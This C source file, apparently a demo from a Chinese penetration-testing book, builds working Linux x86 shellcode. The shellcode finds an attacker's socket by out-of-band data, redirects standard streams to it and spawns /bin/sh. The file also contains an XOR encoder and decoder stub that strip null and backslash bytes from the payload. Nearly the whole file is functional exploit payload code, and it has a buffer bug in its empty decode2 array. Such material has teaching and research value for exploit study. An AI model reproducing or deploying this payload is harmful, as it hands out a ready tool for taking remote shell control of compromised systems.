/* shellcode_oob.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  use OOB find socket shellcode for Linux x86
*  Idea from bkbll
*/

unsigned char sh_Buff[1024];
unsigned int  sh_Len;

unsigned char decode1[] =
/* objdump -j .text -S decode | more
 8048433:       eb 0e                   jmp    8048443 <decode_end>

08048435 <decode_start>:
 8048435:       5a                      pop    %edx
 8048436:       4a                      dec    %edx
 8048437:       31 c9                   xor    %ecx,%ecx
 8048439:       b1 ff                   mov    $0xff,%cl

0804843b <decode_loop>:
 804843b:       80 34 11 99             xorb   $0x99,(%ecx,%edx,1)
 804843f:       e2 fa                   loop   804843b <decode_loop>
 8048441:       eb 05                   jmp    8048448 <decode_ok>

08048443 <decode_end>:
 8048443:       e8 ed ff ff ff          call   8048435 <decode_start>

08048448 <decode_ok>:
*/
"\xeb\x0e\x5a\x4a\x31\xc9\xb1"
"\xff"          // shellcode size
"\x80\x34\x11"
"\x99"          // xor byte
"\xe2\xfa\xeb\x05\xe8\xed\xff\xff\xff"
;

unsigned char decode2[] =
"";

void ShellCode();

// print shellcode
void PrintSc(unsigned char *lpBuff, int buffsize)
{
    int i,j;
    char *p;
    char msg[4];
    fprintf(stderr, "/* %d bytes */\n",buffsize);
    for(i=0;i<buffsize;i++)
    {
        if((i%16)==0)
            if(i!=0)
                fprintf(stderr, "\"\n\"");
            else
                fprintf(stderr, "\"");
        sprintf(msg,"\\x%.2X",lpBuff[i]&0xff);
        for( p = msg, j=0; j < 4; p++, j++ )
        {
            if(isupper(*p))
                fprintf(stderr, "%c", _tolower(*p));
            else
                fprintf(stderr, "%c", p[0]);
        }
    }
    fprintf(stderr, "\";\n");
}

// get shellcode
void GetShellcode()
{
    unsigned char  *fnbgn_str="\x90\x90\x90\x90\x90\x90\x90\x90";
    unsigned char  *fnend_str="\x90\x90\x90\x90\x90\x90\x90\x90";
    unsigned char  *pSc_addr;
    unsigned char  pSc_Buff[1024];
    unsigned int   MAX_Sc_Len=0x2000;
    unsigned int   Enc_key=0x99;
    
    int l,i,j,k;

    // Deal with shellcode
    pSc_addr = (unsigned char *)ShellCode;

    for (k=0;k<MAX_Sc_Len;++k ) {
        if(memcmp(pSc_addr+k,fnbgn_str, 8)==0) {
            break;
        }
    }
    pSc_addr+=(k+8);   // start of the ShellCode

    for (k=0;k<MAX_Sc_Len;++k) {
        if(memcmp(pSc_addr+k,fnend_str, 8)==0) {
            break;
        }
    }
    sh_Len=k; // length of the ShellCode

    memcpy(pSc_Buff, pSc_addr, sh_Len);
    
    //PrintSc(pSc_Buff, sh_Len);

    // find xor byte
    for(i=0xff; i>0; i--)
    {
        l = 0;
        for(j=0; j<(sh_Len); j++)
        {
            if ( 
//                   ((pSc_Buff[j] ^ i) == 0x26) ||    //%
//                   ((pSc_Buff[j] ^ i) == 0x3d) ||    //=
//                   ((pSc_Buff[j] ^ i) == 0x3f) ||    //?
//                   ((pSc_Buff[j] ^ i) == 0x40) ||    //@
                   ((pSc_Buff[j] ^ i) == 0x00) ||
//                   ((pSc_Buff[j] ^ i) == 0x0D) ||
//                   ((pSc_Buff[j] ^ i) == 0x0A) ||
                   ((pSc_Buff[j] ^ i) == 0x5C)
                )
            {
                l++;
                break;
            };
        }

        if (l==0)
        {
            Enc_key = i;
            //printf("Find XOR Byte: 0x%02X\n", i);
            for(j=0; j<(sh_Len); j++)
            {
                pSc_Buff[j] ^= Enc_key;
            }

            break;                        // break when found xor byte
        }
    }
    
    //printf("0x%x\n", Enc_key);
    //PrintSc(pSc_Buff, sh_Len);

    // No xor byte found
    if (l!=0){
        //fprintf(stderr, "No xor byte found!\n");

        sh_Len  = 0;
    }
    else {
        //fprintf(stderr, "Xor byte 0x%02X\n", Enc_key);

        // encode
        if (sh_Len > 0xFF) {
            *(unsigned short *)&decode2[8] = sh_Len;
            *(unsigned char *)&decode2[13] = Enc_key;

            memcpy(sh_Buff, decode2, sizeof(decode2)-1);
            memcpy(sh_Buff+sizeof(decode2)-1, pSc_Buff, sh_Len);
            sh_Len += sizeof(decode2)-1;
        }
        else {
            *(unsigned char *)&decode1[7]  = sh_Len;
            *(unsigned char *)&decode1[11] = Enc_key;

            memcpy(sh_Buff, decode1, sizeof(decode1)-1);
            memcpy(sh_Buff+sizeof(decode1)-1, pSc_Buff, sh_Len);
            sh_Len += sizeof(decode1)-1;
        }
    }
}

void ShellCode()
{
    __asm__
    ("
        .rept 8                         /* 8 nop */
        nop
        .endr

        xorl    %eax, %eax
        pushl   %eax
        incl    %eax
        pushl   %eax
        movl    %esp, %ebx
        xorl    %ecx, %ecx
        movb    $0xa2,%al               /* sys_nanosleep */
        int     $0x80                   /* sleep 1 second to wait for character send */
                                        /* maybe it is necessary in real internet */
        jmp     locate_addr
find_s:
        pop     %edi
        xorl    %esi, %esi
find_s_loop:
        incl    %esi                    /* socket */

        xorl    %eax, %eax
        incl    %eax
        decl    %esp
        movl    %esp, %edx              /* save OOB data */
        pushl   %eax                    /* 1 */
        pushl   %eax                    /* 1 */
        pushl   %edx                    /* &data*/
        pushl   %esi                    /* socket */
        movl    %esp, %ecx              /* arg of socketcall */
        xorl    %ebx, %ebx
        movb    $0x0a,%bl               /* SYS_RECV */
        movb    $0x66,%al               /* sys_socketcall */
        int     $0x80

        decl    %eax                    /* recieve 1 byte? */
        jnz     find_s_loop

        cmpb    $0x49,(%edx)            /* recieve 'I'? */
        jne     find_s_loop

        movl    %esi, %ebx              /* found socket */
        xorl    %ecx, %ecx
        movb    $0x03,%cl
dup2s:
        movb    $0x3f,%al               /* dup2 handle */
        decl    %ecx
        int     $0x80

        incl    %ecx
        loop    dup2s

        xorl    %eax, %eax
        movl    %edi, %ebx              /* /bin/sh */
        leal    0x8(%edi), %edx         /* -isp */
        pushl   %eax
        pushl   %edx
        pushl   %ebx
        movl    %esp, %ecx              /* argv */
        xorl    %edx, %edx              /* envp=NULL */
        movb    $0x0b,%al               /* sys_execve */
        int     $0x80

        xor     %ebx,%ebx
        mov     %ebx,%eax
        inc     %eax
        int     $0x80                   /* sys_exit */


locate_addr:
        call    find_s
        .byte   '/', 'b', 'i', 'n', '/', 's', 'h', 0x0, '-', 'i', 's', 'p', 0x0

        .rept 8                         /* 8 nop */
        nop
        .endr
    ");
}
